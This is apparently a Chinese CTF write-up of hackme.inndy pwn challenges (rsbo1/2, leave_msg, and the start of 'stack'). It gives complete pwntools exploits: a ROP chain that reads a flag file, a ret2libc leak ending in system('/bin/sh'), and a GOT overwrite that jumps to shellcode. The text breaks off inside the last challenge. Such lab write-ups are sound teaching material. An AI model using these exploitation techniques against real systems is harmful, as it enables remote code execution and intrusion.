接着上一篇，我们继续来看看hackme.inndy中的骚pwn题
# rsbo1、2
    Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled***
        PIE:      No PIE (0x8048000)
这两题的文件都一样的，只不过cat到的flag不同
主要的漏洞点出在这里：
解法做法有很多，
第一种做法是，利用open，read，write函数把`/home/ctf/flag`中的flag打印出来
第二种是直接getshell，得到`/home/ctf/flag`的flag和`/home/ctf/flagxxxxxxxx`的flag（分别对应rsbo1和rsbo2的flag）
用第一种方法的话
exp是这样的：
    #!/usr/bin/env python
    # coding=utf-8
    from pwn import *
    context.log_level="debug"
    #p = process('./rsbo1')
    p = remote('hackme.inndy.tw', 7706)
    elf = ELF('./rsbo1')
    start = 0x08048490
    open_plt = elf.symbols['open']
    read_plt = elf.symbols['read']
    write_plt = elf.symbols['write']
    log.info("open_plt -->[%s]"%hex(open_plt))
    log.info("read_plt -->[%s]"%hex(read_plt))
    log.info("read_plt -->[%s]"%hex(write_plt))
    bss = elf.bss()
    offset = 108
    flag_add = 0x80487d0
    payload = '\x00'*offset + p32(open_plt) + p32(start) + p32(flag_add)  + p32(0) 
    p.send(payload)
    payload1 = '\x00'*offset + p32(read_plt) + p32(start) + p32(0x3) + p32(bss) + p32(0x60)
    p.send(payload1)
    payload2 = '\x00'*offset + p32(write_plt) +p32(0xdeadbeef) + p32(1) + p32(bss) + p32(0x60)
    p.send(payload2)
    p.interactive()
这里有几点需要注意的：
  * 程序中flag的路径是`/home/ctf/flag`，但我们本地是没有的，需要自己创建或者打path修改
  * 注意fd = 0时代表标准输入stdin，1时代表标准输出stdout，2时代表标准错误stderr，3~9则代表打开的文件，这里我们只打开了一个文件，那么fd就是3
  * 在栈溢出填充ret_addr的时候，不能用main作为返回地址，要用start才能成功
  * 在填充垃圾字符串的时候，用\x00为了覆盖v8，绕过for循环，否则我们构造的rop链就会被破坏
用第二种方法一起搞定rsbo12的话，就需要直接getshell
getshell的话也有多种做法
下面这种是最简单的，直接用多次返回start，调用函数进行getshell
但这个问题就是，本地怎么打都不通，远程一打就通，醉了醉了
exp如下：
    #encoding:utf-8
    from pwn import *
    context(os="linux", arch="i386",log_level = "debug")
    ip =""#hackme.inndy.tw 
    if ip:
        p = remote(ip,7706)
    else:
        p = process("./rsbo1")
    elf = ELF("./rsbo1")
    libc = ELF("./libc-2.23.so.i386")
    #libc = elf.libc
    #-------------------------------------    def sl(s):
        p.sendline(s)
    def sd(s):
        p.send(s)
    def rc(timeout=0):
        if timeout == 0:
            return p.recv()
        else:
            return p.recv(timeout=timeout)
    def ru(s, timeout=0):
        if timeout == 0:
            return p.recvuntil(s)
        else:
            return p.recvuntil(s, timeout=timeout)
    def debug(msg=''):
        gdb.attach(p,'')
        pause()
    def getshell():
        p.interactive()
    #-------------------------------------    write_plt = elf.plt["write"]
    write_got = elf.got["write"]
    read_plt = elf.plt["read"]
    read_got = elf.got["read"]
    bss =elf.bss()
    write_libc = libc.symbols["write"]
    start = 0x08048490
    binsh_libc= libc.search("/bin/sh").next()
    log.info("bss--->"+hex(bss))
    payload ="\x00"*108+p32(write_plt)+p32(start)+p32(1)+p32(read_got)+p32(4)
    sd(payload)
    read = u32(p.recv(4))
    log.info("read--->"+hex(read))
    libc_base = read - libc.symbols["read"]
    system_addr = libc_base +libc.symbols["system"]
    sleep(0.5)
    payload2 = "\x00" * 108 + p32(read) + p32(start) + p32(0) + p32(bss) + p32(9)
    payload3 = "\x00" * 108 + p32(system_addr) + p32(start) + p32(bss)
    sd(payload2)
    sl("/bin/sh\0")
    sd(payload3)
    getshell()
第二种方法就是用栈迁移和_dl_runtime_resolve的方法，有的大佬用的是这种方法，网上搜一下应该能找到的
ps:寻找常用rop gadget 的命令：
    '''
    ROPgadget --binary ./rsbo1 --only "mov|xor|pop|ret|call|jmp|leave" --depth 20
    Gadgets information
    ============================================================
    0x080483b0 : call 0x80484c6
    0x080484f6 : call eax
    0x08048533 : call edx
    0x08048883 : jmp dword ptr [ebx]
    0x080484f8 : leave ; ret
    0x080481a8 : mov ah, 0xfe ; ret
    0x08048557 : mov al, byte ptr [0xc9010804] ; ret
    0x080484f3 : mov al, byte ptr [0xd0ff0804] ; leave ; ret
    0x08048530 : mov al, byte ptr [0xd2ff0804] ; leave ; ret
    0x08048554 : mov byte ptr [0x804a040], 1 ; leave ; ret
    0x08048528 : mov dword ptr [esp + 4], eax ; mov dword ptr [esp], 0x804a040 ; call edx
    0x08048578 : mov dword ptr [esp], 0x8049f10 ; call eax
    0x080484ef : mov dword ptr [esp], 0x804a040 ; call eax
    0x0804852c : mov dword ptr [esp], 0x804a040 ; call edx
    0x0804872e : mov eax, 0 ; leave ; ret
    0x080484c0 : mov ebx, dword ptr [esp] ; ret
    0x0804879f : pop ebp ; ret
    0x0804879c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
    0x080483cd : pop ebx ; ret
    0x0804879e : pop edi ; pop ebp ; ret
    0x0804879d : pop esi ; pop edi ; pop ebp ; ret
    0x080481aa : ret
    0x08048608 : ret 0xd089
    0x0804850e : ret 0xeac1
    Unique gadgets found: 24
    '''
# leave_msg
    Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    Canary found****
        NX:       NX disabled
        PIE:      No PIE (0x8048000)
        RWX:      Has RWX segments****
这题算是有点骚东西的题吧，首先他有几个段是有rwx权限的，首先可能想到的是会用到shellcode
主要就只分析main函数就行了：
    int __cdecl main()
    {
      int v0; // eax
      signed int i; // [esp+4h] [ebp-424h]
      int index; // [esp+8h] [ebp-420h]
      char nptr; // [esp+Ch] [ebp-41Ch]
      char buf; // [esp+1Ch] [ebp-40Ch]
      char v6; // [esp+24h] [ebp-404h]
      unsigned int v7; // [esp+41Ch] [ebp-Ch]
      v7 = __readgsdword(0x14u);
      setbuf(stdout, 0);
      setbuf(stdin, 0);
      while ( 1 )
      {
        v0 = num++;
        if ( v0 > 2 )//只能输入三次
          break;
        puts("I'm busy. Please leave your message:");
        read(0, &buf, 0x400u);
        puts("Which message slot?");
        read(0, &nptr, 0x10u);
        index = atoi(&nptr);
        if ( strlen(&buf) > 8 )//strlen函数遇到\0就停止计算长度，可通过输入\0绕过
        {
          puts("Message too long, truncated.");
          v6 = 0;
        }
        if ( index <= 64 && nptr != '-' )
           //atoi函数导致index仍然可以为负数，只需要输入“ -x”，
           //atoi会跳过字符串前面的空格或者换行符，直到遇到数字才进行转换
          list[index] = strdup(&buf);
          //strdup会自动申请一块大小和buf一样的堆块，把buf内容复制进堆块
          //接着把堆地址赋值给list[index]
        else
          puts("Out of bound.");
      }
      puts("Here is your messages:");
      for ( i = 0; i <= 63; ++i )
      {
        if ( list[i] )
          printf("%d: %s\n", i, list[i]);
      }
      puts("Goodbye");
      return 0;
    }
由此可以见，0x804a000--0x804b000居然是可以执行的，这里有个骚的地方是，可以在got表写入可执行的代码，在调用某个函数的时候就可以间接执行你的shellcode，但是这里限制了8个字节的长度，那么可写入的shellcode就有限了，仅能做间接跳转使用
这题的思路是这样的：
1、由于存在数组负数越界，就可以往got表修改内容，将got表改成一段汇编指令
2、由于可以绕过8字节检查，通过添加\0把shellcode写进栈里面
3、通过got表中的汇编指令，执行shellcode
首先构造一个输入：`"a"*8+"\x00"+"b" * 8`
这样可以让`"a"*8`被存入puts的got表中，同时绕过八个字节长度的限制，将"b" * 8写入栈中
接下来就是调试，我们需要调试出"b" _8到esp的距离，从而写一条这样的指令`add esp,xxx;jmp esp;`让程序的执行流程到"b" _
8的地方
在第一次输入后的，再第二次call puts函数前下个断点：0x0804861d
在此处下断点，可以得到我们想要看到的栈布局，从而计算出字符串离esp的偏移
si进入call puts：
这里我们就可以看到：输入的字符串离esp的偏移是0x30，如果puts的got表中的内容是`add esp,0x30;jmp esp;`那么这里call
puts的时候就会直接执行这条语句，导致esp的位置指向输入字符串buf的位置
要指向shellcode的话就往下移动 len(jump)+1，就可以指向shellcode了
这题的主要难点应该是需要绕过平常做题的思维局限，got不一定得写地址，在特定的条件下还能写shellcode进行执行，另外就是调试的要熟练，才能找出0x30的偏移
exp：
    #encoding:utf-8
    #!/upr/bin/env python
    from pwn import *
    context.log_level = "debug"
    bin_elf = "./leave_msg"
    context.binary=bin_elf
    elf = ELF(bin_elf)
    libc = ELF("./libc-2.23.so.i386")
    if sys.argv[1] == "r":
        p = remote("hackme.inndy.tw",7715)
    elif sys.argv[1] == "l":
        p = process(bin_elf)
    #-------------------------------------    def sl(s):
        return p.sendline(s)
    def sd(s):
        return p.send(s)
    def rc(timeout=0):
        if timeout == 0:
            return p.recv()
        else:
            return p.recv(timeout=timeout)
    def ru(s, timeout=0):
        if timeout == 0:
            return p.recvuntil(s)
        else:
            return p.recvuntil(s, timeout=timeout)
    def sla(p,a,s):
        return p.sendlineafter(a,s)
    def sda(p,a,s):
        return p.sendafter(a,s)
    def debug(addr=''):
        gdb.attach(p,'')
    def getshell():
        p.interactive()
    #-------------------------------------    shellcode = asm(shellcraft.sh())
    jump = asm("add esp,0x36;jmp esp;")
    sda(p,"I'm busy. Please leave your message:\n",jump+"\x00"+shellcode)
    sda(p,"Which message slot?"," -16")
    getshell()
# stack
    Arch:     i386-32-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
这保护全开，有点少见
这是一个模拟栈的pop和push操作的程序：
主要用到的就是pop函数和push函数：
    int __cdecl stack_pop(_DWORD *a1)
    {
      *a1 += &unk_1FBF + 0xFFFFE040;
      return *(&dword_1FC4[-2032] + &a1[*a1]);
    }
    int __cdecl stack_push(int *a1, int a2)